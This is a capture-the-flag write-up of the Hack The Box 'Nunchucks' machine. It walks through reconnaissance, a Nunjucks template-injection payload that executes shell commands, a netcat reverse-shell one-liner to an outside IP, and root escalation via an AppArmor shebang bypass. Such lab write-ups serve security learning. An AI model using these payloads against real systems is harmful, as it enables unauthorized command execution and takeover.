# Nunchucks - Writeup

**Date**: 04/07/2022

**Difficulty**: Easy

**CTF**: [https://app.hackthebox.com/machines/Nunchucks](https://app.hackthebox.com/machines/Nunchucks)

---

Let’s test the connection with the target machine:

![Untitled](images/Untitled.png)

We have received back the ping, so we have connection. Let’s scan the TCP ports of the target machine using nmap:

![Untitled](images/Untitled%201.png)

3 open ports: 22 (ssh), 80 (http), 443 (https). Let’s scan them further:

![Untitled](images/Untitled%202.png)

Apparently the website hosted in the port 80, redirects us to [https://nunchucks.htb/](https://nunchucks.htb/). Also, the ssl certificate and the DNS of the https service also reveals the domain name, so it seems like is applying virtual hosting. Let’s add this domain to the /etc/hosts file:

![Untitled](images/Untitled%203.png)

Let’s inspect the website using whatweb:

![Untitled](images/Untitled%204.png)

At least now it resolves. Let’s see how it looks using the web browser:

![Untitled](images/Untitled%205.png)

Seems like a normal page… Let’s click on the upper left Nunchucks image:

![Untitled](images/Untitled%206.png)

It opens a index.html page that says that the page doesnt exist. Weird.

![Untitled](images/Untitled%207.png)

We also have a signup form

![Untitled](images/Untitled%208.png)

and a login form

![Untitled](images/Untitled%209.png)

Also, the website is setting a cookie called `_csrf` nice name, this kind of cookies are usually used to prevent CSRF attacks.

Let’s start testing the login form agains sqli:

![Untitled](images/Untitled%2010.png)

![Untitled](images/Untitled%2011.png)

Uh… user logins are disabled. Let’s try then to sign up:

![Untitled](images/Untitled%2012.png)

Ooookay… so no login and no signup.

Anyway the form is sending the information. Maybe if we have a valid cookie the system will allow us to log in?

![Untitled](images/Untitled%2013.png)

Let’s take a look to the website again:

![Untitled](images/Untitled%2014.png)

There is a support email in the footer of the website. Let’s note it, maybe it will be useful…

Let’s enumerate the directories of the website:

![Untitled](images/Untitled%2015.png)

Maybe we can look for subdomains:

![Untitled](images/Untitled%2016.png)

wfuzz discovered the `store` subdomain, let’s add it to the /etc/hosts file

![Untitled](images/Untitled%2017.png)

And now let’s visit the subdomain:

![Untitled](images/Untitled%2018.png)

There is nothing else here but a form… Let’s use it:

![Untitled](images/Untitled%2019.png)

Mmmm… it includes the mail that I entered in the webpage. Maybe this page is vulnerable to SSTI? Let’s check it:

![Untitled](images/Untitled%2020.png)

Yep, it is. 

![Untitled](images/Untitled%2021.png)

NUNJUCKS sound pretty similar to Nunchucks, let’s start with this:

`{{range.constructor("return global.process.mainModule.require('child_process').execSync('COMMAND_WE_WANT_TO_EXECUTE')")()}}`

but adding backslashes to escape double quotes and using burpsuite to bypass the email format check:

![Untitled](images/Untitled%2022.png)

Let’s try to see the passwd file:

![Untitled](images/Untitled%2023.png)

![Untitled](images/Untitled%2024.png)

Let’s look inside the home folder of david, we may find ssh credentials or something useful:

![Untitled](images/Untitled%2025.png)

Ok, there is no .ssh folder, but we can see the user.txt flag:

![Untitled](images/Untitled%2026.png)

Ok, we managed to get the user flag, but we have to access to the target machine. Let’s find a way to establish a reverse shell… 

![Untitled](images/Untitled%2027.png)

ok, the target machine has netcat installed, let’s try a simple `nc -e /bin/sh 10.10.10.10 1234`

![Untitled](images/Untitled%2028.png)

Bad Gateway… something doesn’t work… what if we encode the command in base64 and send it this way?

![Untitled](images/Untitled%2029.png)

It worked, nice. Let’s stabilize the tty:

![Untitled](images/Untitled%2030.png)

Ok, now let’s find a way to escalate privileges. Let’s start looking for SUID files:

![Untitled](images/Untitled%2031.png)

Nothing useful. Let’s see if there is any binary with capabilities:

![Untitled](images/Untitled%2032.png)

Uh, perl has a `setsuid` capability… And it appears in GTFO Bins as something we can take advance of to escalate to root:

![Untitled](images/Untitled%2033.png)

![Untitled](images/Untitled%2034.png)

I tried it. I tried a lot of things but nothing happened:

![Untitled](images/Untitled%2035.png)

Apparently I had to discover this:

![Untitled](images/Untitled%2036.png)

![Untitled](images/Untitled%2037.png)

![Untitled](images/Untitled%2038.png)

What is inside /opt/backup.pl?

![Untitled](images/Untitled%2039.png)

Is a perl script. Let’s execute it:

![Untitled](images/Untitled%2040.png)

![Untitled](images/Untitled%2041.png)

![Untitled](images/Untitled%2042.png)

![Untitled](images/Untitled%2043.png)

Nothing useful there. Let’s investigate a little bit more about AppArmor:

Looking for bugs and vulns I found this one: 

[Bug #1911431 "Unable to prevent execution of shebang lines" : Bugs : AppArmor](https://bugs.launchpad.net/apparmor/+bug/1911431)

![Untitled](images/Untitled%2044.png)

it says that if we create a script with the shebang of the restricted application, it will ignore the restrictions. Let’s try it!

![Untitled](images/Untitled%2045.png)

And now, let’s execute it:

![Untitled](images/Untitled%2046.png)

And that’s how we became root. Pretty interesting.